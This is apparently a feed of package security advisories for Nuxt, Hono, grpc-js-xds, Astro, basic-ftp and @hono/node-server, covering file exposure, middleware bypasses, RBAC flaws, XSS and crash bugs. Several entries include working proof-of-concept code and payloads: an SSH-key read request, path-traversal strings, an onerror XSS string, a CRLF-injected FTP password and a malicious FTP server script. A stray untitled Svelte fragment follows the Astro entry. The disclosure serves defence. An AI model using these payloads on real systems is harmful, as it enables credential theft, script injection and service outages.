entry.title: [@nuxt/schema] Nuxt dev server serves files from a parent directory with a stray lockfile or workspace file
entry.content:
Summary

Nuxt can pick a parent directory that does not declare a workspace as its default workspaceDir: the farthest directory with a lockfile when the project is not inside a git repository, or the farthest directory with a pnpm-workspace.yaml or deno.json file, even one that only holds settings. The Vite dev server allows /_nuxt/@fs/ requests for any file under workspaceDir. A stray lockfile or settings file in a parent directory, such as the home directory, therefore lets anyone who can reach the dev server read files in that directory and everything below it.

Impact

This affects the development server only; production builds are not affected. All of the following have to hold:

  • A parent directory contains either:
    • a lockfile (package-lock.json, pnpm-lock.yaml, yarn.lock, bun.lock and similar), while the project is not inside a git repository and has no workspace file (pnpm-workspace.yaml, turbo.json, lerna.json and similar) above it. Running npm install once in the home directory is enough to create one there.
    • a pnpm-workspace.yaml without a packages list (for example one that only holds pnpm settings such as onlyBuiltDependencies), or a deno.json or deno.jsonc without a workspace field. This applies even if the project is inside a git repository.
  • The dev server is reachable from the network (nuxt dev --host, nuxt dev --tunnel, a published container port, or a proxy onto the dev port). The default localhost bind limits this to local processes, which can usually read the same files directly.

For example, with ~/package-lock.json and a project at ~/projects/app that has no .git directory, nuxt dev --host serves GET /_nuxt/@fs/<home>/.ssh/id_ed25519 with status 200. Any file in the home directory that is not covered by Vite's server.fs.deny list can be read this way, including SSH keys, cloud credentials and the Nuxt DevTools auth token in ~/.nuxt/devtools/dev-auth-token.txt.

No browser is involved: a plain HTTP client is enough. A web page on another origin cannot read the response, and DNS rebinding is rejected by Vite's host check.

Projects whose parent directories contain none of these files are not affected, nor are projects inside a git repository whose only lockfile is their own. Nuxt 3.5.0 and later are affected.

Patches

Fixed in @nuxt/schema 4.6.4, which nuxt 4.6.4 depends on. A parent directory now only becomes the default workspaceDir if it declares a workspace: a pnpm-workspace.yaml with packages, a deno.json or deno.jsonc with workspace, a lerna.json, turbo.json or rush.json, a package.json with workspaces, or a git repository. A lockfile or a settings file alone no longer widens the dev server's server.fs.allow list. If your monorepo root is not detected this way, set workspaceDir in nuxt.config.ts. Nuxt 3 has reached end of life and will not receive a fix.

Workarounds

Set workspaceDir explicitly in nuxt.config.ts to the project root (or to the real monorepo root), or remove the stray lockfile or settings file from the parent directory. Do not expose the dev server to untrusted networks. If the dev port was reachable from an untrusted network while this layout was in place, treat files in the parent directory as exposed and rotate credentials such as SSH keys and cloud tokens.

Credits

Nuxt thanks @superboy-zjc for the report.

References

  • https://github.com/nuxt/nuxt/security/advisories/GHSA-mjrq-cffv-q4qc
  • https://github.com/nuxt/nuxt/commit/89d3306d1976dd52ac2e73078806a3e889cbb8bd
  • https://github.com/nuxt/nuxt/releases/tag/v4.6.4
  • https://github.com/advisories/GHSA-mjrq-cffv-q4qc

entry.title: [hono] Hono: `csrf()` does not check requests sent by hyperlink auditing (`text/ping`)
entry.content:
Summary

csrf() validates a request only when its Content-Type is one of the three types an HTML form can send. Chromium's hyperlink auditing (<a ping>) sends a cross-origin POST with the user's cookies and the content type text/ping, which is not in that list. The middleware does not look at Origin or Sec-Fetch-Site for such a request, so it is passed to the handler.

Details

The middleware skips the origin check when the content type is not one that a form submission produces. The assumption was that any other content type requires a CORS preflight and therefore cannot be sent cross-origin with credentials. Hyperlink auditing is an exception: Chrome and Edge send the ping as a credentialed POST without a preflight, with a fixed body and Content-Type: text/ping.

A page on another origin can therefore trigger a POST to any URL of the application. The csrf() options for origin and secFetchSite do not change the outcome, because neither header is evaluated for the request.

The request body is fixed, so only actions whose effect does not depend on the body can be triggered. Firefox does not send pings by default. As with any CSRF, the user's cookie must be sent with the request, which with the default SameSite=Lax means a same-site origin or a cookie set with SameSite=None.

Impact

A user who visits a malicious page in Chrome or Edge while logged in to an application protected by csrf() can be made to send a state-changing request to that application, such as logging out, deleting a resource, or toggling a setting that is selected by the path or query string.

This issue affects applications that rely on csrf() as their CSRF protection and expose state-changing endpoints whose effect does not depend on the request body.

Workarounds

Reject requests with a Content-Type of text/ping in a middleware registered before csrf(), or set session cookies with SameSite=Strict.

References

  • https://github.com/honojs/hono/security/advisories/GHSA-46wx-v44x-9hh2
  • https://github.com/honojs/hono/commit/bf16471913b5199212dac33f5d170f94745dd26a
  • https://github.com/honojs/hono/releases/tag/v4.13.16
  • https://github.com/advisories/GHSA-46wx-v44x-9hh2

entry.title: [hono] Hono: `validator('form')` skips validation for `multipart/form-data` requests with extra parameters
entry.content:
Summary

validator('form') only recognizes a multipart/form-data Content-Type that carries nothing but a single boundary parameter. A request with another legal parameter, such as charset, or with extra whitespace after the ; is not recognized as a form. The validation callback then receives an empty object, while c.req.parseBody() still parses the body as a form.

Details

The check that decides whether a request body is a form was written as a strict pattern over the whole Content-Type value. Any parameter list that does not look exactly like ; boundary=... fails the check. When it fails, the middleware does not read the body and passes an empty object to the validation callback. If the callback accepts an empty object, the request proceeds to the handler, which can still read all submitted fields through c.req.parseBody() or c.req.formData().

application/x-www-form-urlencoded is not affected. Only the multipart/form-data branch has the strict pattern.

This issue arises when an application relies on validator('form') to reject or restrict fields and the validation callback does not fail on an empty object.

Impact

An unauthenticated client can send form fields that the form validator never sees, by adding a legal parameter to the Content-Type header.

This may lead to:

  • Allow-list or required-field checks in the validator being skipped
  • Fields the application intended to reject reaching the handler

This issue affects applications that use validator('form') with multipart/form-data requests and whose validation callback accepts an empty object.

Workarounds

Reject an empty object in the validator('form') callback, or validate the result of await c.req.parseBody() in the handler.

References

  • https://github.com/honojs/hono/security/advisories/GHSA-4h7h-rv7c-7m2v
  • https://github.com/honojs/hono/commit/d88fab372415277a9e540e895650943dd08eef4a
  • https://github.com/honojs/hono/releases/tag/v4.13.16
  • https://github.com/advisories/GHSA-4h7h-rv7c-7m2v

entry.title: [hono] Hono: `mount()` and `app.mount()` can forward a path that bypasses middleware scoped inside the mount prefix
entry.content:
Summary

mount() and app.mount() remove the mount prefix from the request path and forward the rest to the mounted application. Two mistakes in that step let a crafted request reach a route of the mounted application that the outer application protects with path-scoped middleware, such as an authentication check on /app/admin/*. The outer application routes on the original path, so the middleware does not run.

Details

  1. Dynamic prefix (all affected versions): for a mount such as /api/:tenant/*, the prefix was removed by the length of the route pattern, not of the matched prefix. A request with a longer or shorter first segment is cut in the middle, so /api/a/xxxxx/admin/secret reaches the mounted application as /admin/secret.
  2. Re-normalization (since 4.12.21): the forwarded path was built from the decoded request path and assigned to url.pathname, which turns a decoded backslash into / and collapses ... /app/public%5C..%5Cadmin/secret reaches the mounted application as /admin/secret.

The fix removes the prefix segment by segment from the raw pathname, using the matched parameter values for its length. Route patterns that cannot be handled safely now throw: duplicate parameter names and a wildcard inside the last segment such as /assets*. A trailing slash in an app.mount() prefix no longer removes an extra segment.

Impact

An unauthenticated client can reach a route of a mounted application that the outer application protects with path-scoped middleware.

This affects applications that use mount() or app.mount() and rely on middleware registered on a sub-path inside the mount prefix for authentication or authorization.

Workarounds

Register the authentication middleware inside the mounted application.

References

  • https://github.com/honojs/hono/security/advisories/GHSA-4m76-xfj5-7975
  • https://github.com/honojs/hono/commit/34f90432a1794b28e52802670efcd01963f716d6
  • https://github.com/honojs/hono/releases/tag/v4.13.16
  • https://github.com/advisories/GHSA-4m76-xfj5-7975

entry.title: [hono] Hono: RegExpRouter skips wildcard middleware for some route sets and for paths with an encoded line terminator
entry.content:
Summary

RegExpRouter, which the default SmartRouter selects for most applications, skipped wildcard middleware in three cases, so a route handler ran without the middleware registered for it:

  1. Middleware whose parameter is written with the explicit default pattern, such as /api/:tenant{[^/]+}/admin/*, was not applied to a route written as /api/:tenant/admin/:id. (since 4.13.0)
  2. Middleware on /admin/* was not applied to a route registered on /admin* for paths under /admin/. (since 4.1.4)
  3. For a path with an encoded line terminator (%0A, %0D, %E2%80%A8, %E2%80%A9), no wildcard pattern matched, so the request reached the not-found handler without any wildcard middleware. (since 4.4.0)

TrieRouter, LinearRouter and PatternRouter apply the middleware in all three cases.

Details

RegExpRouter decides at registration time which wildcard middleware covers which route. In cases 1 and 2 it treated patterns that match the same requests as different ones. In case 3 the compiled wildcard did not match line terminators.

The fix derives the coverage from the structure of the registered paths and lets wildcards match line terminators. It also corrects other differences from the other routers (a wildcard in the middle of a path with parameters, duplicate middleware, middleware on static routes), and rejects custom patterns that can match the empty string, such as {[0-9]*}, with UnsupportedPathError. PreparedRegExpRouter data must be regenerated.

Impact

An unauthenticated client can reach a route handler, or the not-found handler, without the authentication or authorization middleware registered on a wildcard path.

This affects applications that use RegExpRouter, directly or through the default SmartRouter, and rely on wildcard middleware for authentication or authorization.

Workarounds

Use new Hono({ router: new TrieRouter() }).

References

  • https://github.com/honojs/hono/security/advisories/GHSA-h7mg-cq63-vhpq
  • https://github.com/honojs/hono/commit/8a103aa59bcfbffd5396b1548a0dff3688777c36
  • https://github.com/honojs/hono/releases/tag/v4.13.16
  • https://github.com/advisories/GHSA-h7mg-cq63-vhpq

entry.title: [hono] Hono: `css` helper does not escape a closing tag split between the template and an interpolated value, allowing HTML injection
entry.content:
Summary

The css helper in hono/css escapes a / that follows < inside an interpolated value so that a value cannot close the <style> element. The check only looks inside each value. When the text before a value ends with <, whether that is the template itself or an earlier interpolated value, and the next value starts with /, the / is not escaped and the combined output contains an unescaped closing tag.

Details

Interpolated string values are escaped one at a time before they are joined with the surrounding template text. The rule that neutralizes </ therefore cannot see a < that belongs to the template. A template such as a content declaration that opens with a literal < and interpolates a string right after it produces a raw </style> when that string starts with /style>. During server-side rendering the <Style /> element is closed early and the rest of the value is interpreted as HTML.

This issue arises only when < is the last character before an interpolation in a css template, either written in the template or supplied by a preceding value, and the interpolated value is controlled by a client.

Impact

A client that controls such a value can inject HTML, including script, into the page rendered on the server.

This may lead to:

  • Execution of attacker-controlled script in the browser of a user who views the page
  • Exposure of information available to that page

This issue affects applications that interpolate untrusted strings into a css template immediately after a <, including two adjacent interpolations such as ${prefix}${name} where both are untrusted. Other uses of the css helper are not affected.

Workarounds

Do not interpolate untrusted values into css templates, or make sure the text before an interpolated value does not end with <.

References

  • https://github.com/honojs/hono/security/advisories/GHSA-3gg2-335m-rxc6
  • https://github.com/honojs/hono/commit/15bbd96ad1b62a0b189db4fd8dc7bf8ef280c513
  • https://github.com/honojs/hono/releases/tag/v4.13.16
  • https://github.com/advisories/GHSA-3gg2-335m-rxc6

entry.title: [@grpc/grpc-js-xds] @grpc/grpc-js: safe_regex incorrectly applies partial string matching for patterns with alternation
entry.content:
Summary

The StringMatcher/PathMatcher for safe_regex builds its RE2 as ^${regex}$ with no surrounding group. Because alternation has the lowest precedence, a pattern "a|b|c" compiles to /^a|b|c$/ -- "starts with a" OR "contains b" OR "ends with c" instead of a full match of the whole value. Configurations with safe_regex matchers that use a regex alternation (a natural way to list methods or service identities) therefore apply partial string matches. This impacts route selection, xDS credentials, and RBAC.

Details

src/matcher.ts: SafeRegexValueMatcher and PathSafeRegexValueMatcher both do

this.targetRegexImpl = new RE2(`^${targetRegex}$`, 'u');

and apply() returns targetRegexImpl.test(value). With a top-level alternation the anchors bind only to the first/last branch.

https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/matcher.ts#L59

https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/matcher.ts#L232

src/route.ts (getPredicateForStringMatcher / getPredicateForHeaderMatcher) builds these for every safe_regex StringMatcher/HeaderMatcher, and src/rbac.ts uses them for RBAC url_path permissions/principals, authenticated.principal_name (mTLS SAN/CN), requested_server_name and header rules. So an ALLOW rule written with an alternation grants access to method names, certificate identities or header values that extend an intended one. DENY policies only become broader (fail-safe).

https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/route.ts#L28

https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/route.ts#L47

Proof of concept

In a scratch directory:

npm init -y
npm i @grpc/grpc-js-xds@1.14.1 @grpc/grpc-js
node poc.cjs

poc.cjs calls the exported RBAC engine directly (the functions grpc-js uses to make the authorization decision); no server or network:

const { parseConfig } = require('@grpc/grpc-js-xds/build/src/rbac.js')
const { SafeRegexValueMatcher } = require('@grpc/grpc-js-xds/build/src/matcher.js')
const { Metadata } = require('@grpc/grpc-js')

console.log(new SafeRegexValueMatcher('admin|editor').toString()) // SafeRegex(/^admin|editor$/u)

const sr = regex => ({ match_pattern: 'safe_regex', safe_regex: { regex } })
const info = urlPath => ({ urlPath, headers: new Metadata(), tls: true, peerCertificate: null,
  destinationIp: '10.0.0.1', destinationPort: 443, sourceIp: '10.0.0.2' })
const g = parseConfig({ action: 'ALLOW', policies: { p: {
  permissions: [{ rule: 'url_path', url_path: { path: sr('/acme.Users/GetUser|/acme.Users/ListUsers') } }],
  principals: [{ identifier: 'any', any: true }] } } })

console.log('GetUser       ', g.apply(info('/acme.Users/GetUser')))       // true  (intended)
console.log('DeleteUser    ', g.apply(info('/acme.Users/DeleteUser')))    // false (control)
console.log('GetUserSecrets', g.apply(info('/acme.Users/GetUserSecrets'))) // true <-- BYPASS

Observed (grpc-js-xds 1.14.1, grpc-js 1.14.6):

matcher "admin|editor" -> SafeRegex(/^admin|editor$/u);
    apply("administrator")=true, apply("not-an-editor")=true
ALLOW url_path /acme.Users/GetUser|/acme.Users/ListUsers:
    /acme.Users/GetUser         -> ALLOWED (intended)
    /acme.Users/DeleteUser      -> denied  (control)
    /acme.Users/GetUserSecrets  -> ALLOWED <-- bypass (policy intends deny)
control, same regex as (?:...|...): /acme.Users/GetUserSecrets -> denied
ALLOW authenticated principal_name spiffe://prod/ns/web/sa/frontend|...ops/sa/admin:
    spiffe://prod/ns/web/sa/frontend-batch -> ALLOWED <-- bypass

Impact

Users of @grpc/grpc-js-xds who are using safe_regex matchers with alternation for route selection, xDS credentials SAN matchers, or RBAC rules may see incorrectly permissive behavior.

References

  • https://github.com/grpc/grpc-node/security/advisories/GHSA-r7hq-q2xm-6c5m
  • https://github.com/grpc/grpc-node/commit/3fc3b0ebf7a89d64843a73679951142d33b40cb1
  • https://github.com/grpc/grpc-node/commit/57a67e96babcb29b6eabc1833221ccf2fa152d43
  • https://github.com/grpc/grpc-node/releases/tag/@grpc/grpc-js-xds@1.13.2
  • https://github.com/grpc/grpc-node/releases/tag/@grpc/grpc-js-xds@1.14.2
  • https://github.com/advisories/GHSA-r7hq-q2xm-6c5m

entry.title: [@grpc/grpc-js-xds] @grpc/grpc-js: RBAC override configs in VirtualHost and Route resources are not applied
entry.content:
Summary

XdsServer in @grpc/grpc-js-xds does not apply RBACPerRoute overrides from matching Route or VirtualHost resources. When a trusted xDS control plane supplies a broad top-level ALLOW policy and a stricter override, XdsServer ACKs the resources but evaluates the RPC under the top-level policy.

Details

Override parser lookup uses the override message type

parseOverrideFilterConfig() in packages/grpc-js-xds/src/http-filter.ts:225-257 looks up FILTER_REGISTRY using the override message type:

type.googleapis.com/envoy.extensions.filters.http.rbac.v3.RBACPerRoute Source: https://github.com/grpc/grpc-node/blob/56567d9604b4e45cdca0d2e3c2a60ac227ee659d/packages/grpc-js-xds/src/http-filter.ts#L225-L257

setup() in packages/grpc-js-xds/src/http-filter/rbac-filter.ts:167-173 registers the filter only under the top-level RBAC type:

type.googleapis.com/envoy.extensions.filters.http.rbac.v3.RBAC Source: https://github.com/grpc/grpc-node/blob/56567d9604b4e45cdca0d2e3c2a60ac227ee659d/packages/grpc-js-xds/src/http-filter/rbac-filter.ts#L167-L173

The lookup returns null even though the registered entry contains parseOverrideRbacConfig(), and server.ts silently skips the override.

Override maps are keyed by type URL instead of filter name

overrideConfigMaps in server.ts:99-102 is documented as keyed by HTTP filter name, but server.ts:169-174 stores each map under filterConfig.typeUrl.

Source: https://github.com/grpc/grpc-node/blob/56567d9604b4e45cdca0d2e3c2a60ac227ee659d/packages/grpc-js-xds/src/server.ts#L99-L102

Source: https://github.com/grpc/grpc-node/blob/56567d9604b4e45cdca0d2e3c2a60ac227ee659d/packages/grpc-js-xds/src/server.ts#L169-L174

Route overrides are later looked up by their typed_per_filter_config key, which is the HttpFilter.name. An ordinary key such as rbac therefore misses the stored map.

VirtualHost overrides are not read

handleRouteConfigurationResource() in server.ts:225-249 reads route.typed_per_filter_config but never reads virtualHost.typed_per_filter_config.

Source: https://github.com/grpc/grpc-node/blob/56567d9604b4e45cdca0d2e3c2a60ac227ee659d/packages/grpc-js-xds/src/server.ts#L225-L249

When no override reaches the RBAC interceptor, rbac-filter.ts:125-155 evaluates the broader top-level policy.

Proof of concept

Set:

GRPC_XDS_EXPERIMENTAL_RBAC=true

Run XdsServer with a protected unary handler.

Have the ADS control plane deliver a Listener containing an RBAC HTTP filter named rbac with a top-level ALLOW-any policy:

name: rbac
typed_config:
  "@type": type.googleapis.com/envoy.extensions.filters.http.rbac.v3.RBAC
  rules:
    action: ALLOW
    policies:
      allow-any:
        principals: [{ any: true }]
        permissions: [{ any: true }]

Deliver a matching non-forwarding route with this override:

typed_per_filter_config:
  rbac:
    "@type": type.googleapis.com/envoy.extensions.filters.http.rbac.v3.RBACPerRoute
    rbac:
      rules:
        action: DENY
        policies:
          deny-any:
            principals: [{ any: true }]
            permissions: [{ any: true }]

Invoke the protected unary method without credentials.

Expected: The route-specific DENY policy rejects the RPC before the protected handler runs.

Observed: XdsServer ACKs the resources, retains the top-level ALLOW policy, and runs the protected handler.

Listener and RouteConfiguration: ACKED
gRPC status: OK
handler invocations: 1
response: PROTECTED_SECRET_RECORD_RBAC_OVERRIDE

Impact

Users of @grpc/grpc-js-xds who are using RBAC-based authentication with override configurations may unintentionally accept some requests that should be rejected.

entry.title: [@astrojs/solid-js] Astro: Reflected XSS via unescaped slot names in @astrojs/solid-js
entry.content:
Summary

The @astrojs/solid-js renderer wraps named slot content passed to Solid components in an <astro-slot> element, and writes the slot name into its name attribute without HTML escaping. A slot name containing " could end the attribute and inject arbitrary HTML into the page.

For example, a page that takes a slot name from the request:

---
import Tabs from '../components/Tabs.jsx';
const tab = Astro.url.searchParams.get('tab');
---
<Tabs client:load active={tab}><div slot={tab}>…</div></Tabs>

rendered with a Solid component that renders a slot by name:

export default function Tabs(props) {
    return <div>{props[props.active]}</div>;
}

would output a tab value such as x"><img src=x onerror=alert(1)> as live HTML.

Impact

Reflected cross-site scripting. An attacker who gets a user to open a crafted link can run JavaScript on the site's origin, but only in applications where all of the following are true:

  • The page passes request-controlled input (such as a query parameter) as a slot name.
  • The Solid component is hydrated with a client:* directive. For non-hydrated components the slot wrapper is removed from the output, together with its name attribute.
  • The Solid component renders the attacker-chosen slot, which in practice means accessing slot props by a dynamic name. Components that never render the slot only output Astro's already escaped fallback template.

This is the @astrojs/solid-js counterpart of GHSA-8hv8-536x-4wqp (CVE-2026-50146), which fixed the same issue in astro core.

Affected versions

@astrojs/solid-js >= 0.2.0, <= 7.1.1.

Patches

Fixed in @astrojs/solid-js 7.1.2. Slot names are now HTML-escaped in the server renderer.

Workarounds

Upgrade to @astrojs/solid-js 7.1.2 or later. Before upgrading, do not use request-controlled input as a slot name, or map it to a fixed set of known slot names before passing it to a component.

Credits

Reported by @manus-pi.

References

  • https://github.com/withastro/astro/security/advisories/GHSA-jmv2-qgxf-f995
  • https://github.com/withastro/astro/commit/290b196ddb48de11783ff128e2b7272c61490a20
  • https://github.com/withastro/astro/releases/tag/@astrojs/solid-js@7.1.2
  • https://github.com/advisories/GHSA-jmv2-qgxf-f995

<Tabs client:load active={tab}><div slot={tab}>…</div></Tabs>

rendered with a Svelte 5 component that renders its snippets by name:

<script>
    let { active, ...snippets } = $props();
</script>
{@render snippets[active]?.()}

would output a tab value such as x"><img src=x onerror=alert(1)> as live HTML.

entry.title: [basic-ftp] basic-ftp: Uncaught exception crashes the Node.js process when a password (or resumed-download path) contains CR/LF
entry.content:
Summary

Client.login() calls FTPContext.send() from inside the control-socket data event handler. send() throws on CR, LF or NUL, and nothing catches the throw. A password containing \r\n therefore raises an uncaught exception and terminates the whole Node.js process. It does not reject the returned promise. Any application that passes untrusted input as the FTP password can be crashed remotely with one request. The same pattern exists in the REST/RETR path of downloadTo() when the remote path contains control characters.

Details

The CRLF guard (FTPContext.send, src/FtpContext.ts ~L233) correctly refuses to send commands containing \r, \n or \0:

send(command: string) {
    if (/[\r\n\0]/.test(command)) {
        throw new Error(`Invalid command: Contains control characters. (${command})`);
    }

That works when send() is called from handle(), because it runs inside a Promise executor and the throw becomes a rejection. But in two places send() runs inside a response handler, which is called synchronously from the socket’s data event:

Client.login() (src/Client.ts ~L246-248): after the server answers 331 to USER, the handler calls this.ftp.send("PASS " + password). The USER command was already sent and is valid, so the password is only checked at this point. The call chain is socket.on("data") → _onControlSocketData → _passToHandler → responseHandler → send() → throw. No try/catch exists anywhere in that chain, so it becomes an uncaughtException. downloadTo() (src/transfer.ts ~L368-370): when startAt > 0, the initial command is REST n, which contains no user-controlled text. When the server answers 350, the handler calls config.ftp.send("RETR " + config.remotePath). This remotePath was never checked before. A path with a control character throws in the data handler in the same way. (Found by code reading, not reproduced.)

Because the exception happens during data event dispatch, it can’t be handled with try/catch or .catch() around client.access() or downloadTo(). The application only survives if it has a global process.on("uncaughtException") handler.

Proof of concept

Tested on Node.js v22.22.0 against basic-ftp 6.2.2 (built from source). It uses a minimal mock FTP server on localhost:

const net = require("net")
const ftp = require("basic-ftp")

const srv = net.createServer(s => {
  s.write("220 hi\r\n")
  s.on("data", d => {
    const c = d.toString()
    if (c.startsWith("USER")) s.write("331 pw\r\n")
    else if (c.startsWith("PASS")) s.write("230 ok\r\n")
    else s.write("200 ok\r\n")
  })
})

srv.listen(0, async () => {
  const c = new ftp.Client(2000)
  try {
    await c.access({
      host: "127.0.0.1",
      port: srv.address().port,
      user: "bob",
      password: "x\r\nDELE important"   // attacker-controlled value
    })
  } catch (e) {
    console.log("rejected:", e.message)  // never reached
  }
  console.log("handled gracefully")      // never reached
  process.exit(0)
})

Result: the process terminates with an uncaught exception and neither catch nor the final console.log runs:

Error: Invalid command: Contains control characters. (PASS x
DELE important)
    at FTPContext.send (dist/FtpContext.js:189:19)
    at Object.responseHandler (dist/Client.js:186:26)
    at FTPContext._passToHandler (dist/FtpContext.js:322:24)
    at FTPContext._onControlSocketData (dist/FtpContext.js:312:18)
    at Socket.<anonymous> (dist/FtpContext.js:133:44)

The server in the PoC is benign. Any normal FTP server that replies 331 to USER triggers the same crash.

Impact

Denial of service (uncaught exception, process termination), CWE-248.

It affects applications that pass untrusted or user-influenced values as the FTP password, or as the remote path of a resumed download. Examples are web apps or services that let users enter their own FTP credentials, or file-transfer or backup tools driven by user-supplied paths. One request crashes the whole Node.js process and every other client it serves. It needs no authentication to the FTP server and no special server behaviour. The attacker only needs control over the string. Confidentiality and integrity are not affected, and the CRLF guard still blocks command injection.

Suggested fix:

In FTPContext._passToHandler(), wrap the handler call in a try/catch that rejects the task and calls closeWithError(err). Validate password in login(), and remotePath in _downloadToStream(), before any I/O and reject early.

References

  • https://github.com/patrickjuchli/basic-ftp/security/advisories/GHSA-r4jh-29pc-gfqr
  • https://github.com/patrickjuchli/basic-ftp/commit/0495b906bdf891e68806721b07b333dba65ec88e
  • https://github.com/patrickjuchli/basic-ftp/releases/tag/v6.2.3
  • https://github.com/advisories/GHSA-r4jh-29pc-gfqr

entry.title: [basic-ftp] basic-ftp: Uncaught TypeError in MLSD directory-listing parser via __proto__ fact name causes DoS in Client.list()
entry.content:
Summary

basic-ftp's MLSD directory-listing parser (src/parseListMLSD.ts) looks up fact-handler functions in a plain object literal keyed directly by fact names taken from the FTP server's response, with no validation. A directory-listing line containing the fact name "proto" resolves this lookup to Object.prototype (inherited, non-own, non-function) instead of undefined, so the "not a function" guard is bypassed and the code throws TypeError: factHandler is not a function.

This TypeError is not an FTPError, so it is not caught by Client.list()'s retry logic and propagates as a rejected promise out of list() and every API built on top of it (list, downloadToDir, uploadFromDir, clearWorkingDir, removeDir). Any FTP server the client connects to — or any on-path attacker on a plaintext (non-TLS) FTP session — can crash the calling application by returning one crafted line in a directory listing. If the application does not wrap every one of these calls in try/catch, the rejection is unhandled and crashes the Node.js process (default behavior since Node 15).

Details

File: src/parseListMLSD.ts

const factHandlersByName: {[key: string]: FactHandler} = {
    "size": parseSize,
    "sizd": parseSize,
    "unique": (value, info) => { info.uniqueID = value },
    "modify": (value, info) => { ... },
    "type": (value, info) => { ... },
    "unix.mode": (value, info) => { ... },
    ...
}

export function parseLine(line: string): FileInfo | undefined {
    const [ packedFacts, name ] = splitStringOnce(line, " ")
    ...
    const facts = packedFacts.split(";")
    for (const fact of facts) {
        const [ factName, factValue ] = splitStringOnce(fact, "=")
        if (!factValue) { continue }
        const factHandler = factHandlersByName[factName.toLowerCase()]   // <-- unsafe lookup
        if (!factHandler) { continue }
        const result = factHandler(factValue, info)                     // <-- throws here
        ...
    }
    return info
}

factHandlersByName is a plain {} object literal, so it inherits from Object.prototype. Property access does not distinguish own keys from inherited ones. When factName.toLowerCase() === "proto", the bracket lookup factHandlersByName["proto"] returns Object.prototype itself — a truthy, non-undefined value — so the if (!factHandler) continue guard does not fire. The code then tries to call Object.prototype as a function: factHandler(factValue, info), which throws TypeError: factHandler is not a function.

This line runs inside parseList() (src/parseList.ts), called synchronously from a .map() over every line of the listing, which in turn is called from Client._requestListWithCommand() -> Client.list() (src/Client.ts). list()'s only error handling is:

    catch (err) {
        const shouldTryNext = err instanceof FTPError
        if (!shouldTryNext) { throw err }
        lastError = err
    }

A plain TypeError is not an FTPError, so it is immediately rethrown instead of being retried or suppressed, and the Promise returned by list() rejects with it.

Affected call paths (all eventually call Client.list()):

  • Client.list()
  • Client.downloadToDir() / _downloadFromWorkingDir()
  • Client.clearWorkingDir()
  • Client.removeDir()

Only "proto" triggers the crash this way; other reserved Object.prototype property names tested ("constructor", "toString", "hasOwnProperty", "valueOf", "defineGetter") happen to resolve to actual functions on Object.prototype, so they are called without throwing (silently ineffective, not a crash). This confirms the root cause is the use of an unguarded object literal as a dictionary keyed by untrusted server input, rather than something specific to one property.

Proof of concept

Prerequisites: Node.js, a clone/checkout of basic-ftp, npm install then npm run buildOnly (or npx tsc) to produce dist/.

Step 1 — Minimal reproduction of the parser bug alone:

node -e '
const { parseList } = require("./dist/parseList");
parseList("__proto__=x;type=file;size=10; evil.txt");
'

Expected result: Uncaught TypeError: factHandler is not a function at parseLine (.../dist/parseListMLSD.js:...)

Step 2 — End-to-end reproduction through the public Client API, proving a real FTP server can trigger this over the wire with no client modification:

Save as poc.js in the repo root and run `node poc.js`:

const net = require("net")
const { Client } = require("./dist/index")

const server = net.createServer(socket => {
    socket.write("220 fake ftp ready\r\n")
    socket.on("data", data => {
        const cmd = data.toString().trim()
        if (cmd.startsWith("USER")) socket.write("230 ok\r\n")
        else if (cmd.startsWith("OPTS") || cmd.startsWith("TYPE") ||
                 cmd.startsWith("STRU") || cmd.startsWith("PBSZ") ||
                 cmd.startsWith("PROT")) socket.write("200 ok\r\n")
        else if (cmd.startsWith("FEAT")) socket.write("211-Features\r\n MLST type;size;\r\n211 End\r\n")
        else if (cmd.startsWith("EPSV")) {
            const dataServer = net.createServer(dsock => {
                // The malicious line: fact name "__proto__"
                dsock.end("__proto__=pwn;type=file;size=4; evil.txt\r\n")
            })
            dataServer.listen(0, "127.0.0.1", () => {
                const p = dataServer.address().port
                socket.write(`229 Entering Extended Passive Mode (|||${p}|)\r\n`)
            })
        }
        else if (cmd.startsWith("MLSD") || cmd.startsWith("LIST")) {
            socket.write("150 Here comes the listing\r\n")
            setTimeout(() => socket.write("226 Listing complete\r\n"), 50)
        }
        else socket.write("200 ok\r\n")
    })
})

server.listen(2121, "127.0.0.1", async () => {
    const client = new Client()
    try {
        await client.access({ host: "127.0.0.1", port: 2121, user: "a", password: "b" })
        const files = await client.list()
        console.log("list() returned normally (unexpected):", files)
    } catch (err) {
        console.log("client.list() threw:", err.constructor.name, "-", err.message)
    } finally {
        client.close()
        server.close()
        process.exit(0)
    }
})

Expected output:

client.list() threw: TypeError - factHandler is not a function

Configuration notes:

  • No TLS, auth bypass, or special server config needed — this is a plain FTP (PASV/EPSV text) session using the server's FEAT response to turn on MLSD, which is the common path for any modern FTP server.
  • The same crash can be delivered via a LIST-fallback MLSD-shaped line too, since parseList() auto-detects the format from the last listing line.
  • In a real application without a try/catch around list()/downloadToDir()/ clearWorkingDir()/removeDir(), this rejection is unhandled and terminates the Node.js process by default (Node >=15 unhandledRejection behavior is "throw").

Impact

Type: Denial of Service (CWE-248: Uncaught Exception, enabled by CWE-1321-style unguarded dictionary lookup on an object literal).

Who is impacted: Any application using basic-ftp's Client.list(), downloadToDir(), uploadFromDir() (via ensureDir/clearWorkingDir paths), clearWorkingDir(), or removeDir() against a server that is malicious, compromised, or reachable by an on-path attacker on a non-TLS FTP session. No authentication to the target server is required beyond whatever credentials the application already uses, and no user interaction is required — a single crafted directory-listing line is sufficient.

Confidentiality: None. Integrity: None. Availability: High — unhandled rejection crashes the Node.js process by default, taking down the whole application/service, not just the FTP operation.

References

  • https://github.com/patrickjuchli/basic-ftp/security/advisories/GHSA-5pm8-86m8-9m6r
  • https://github.com/patrickjuchli/basic-ftp/commit/a22664a45d889f7d281e5bdd212c68c0a58d0ae6
  • https://github.com/patrickjuchli/basic-ftp/releases/tag/v6.2.4
  • https://github.com/advisories/GHSA-5pm8-86m8-9m6r

entry.title: [@hono/node-server] @hono/node-server: Unhandled `ECONNRESET` on the socket during an asynchronous WebSocket upgrade crashes the process
entry.content:
Summary

While @hono/node-server waits for the Hono application to handle a WebSocket upgrade request, the socket has no error listener. If the client resets the TCP connection during that time, the resulting ECONNRESET is emitted as an unhandled 'error' event and the process terminates.

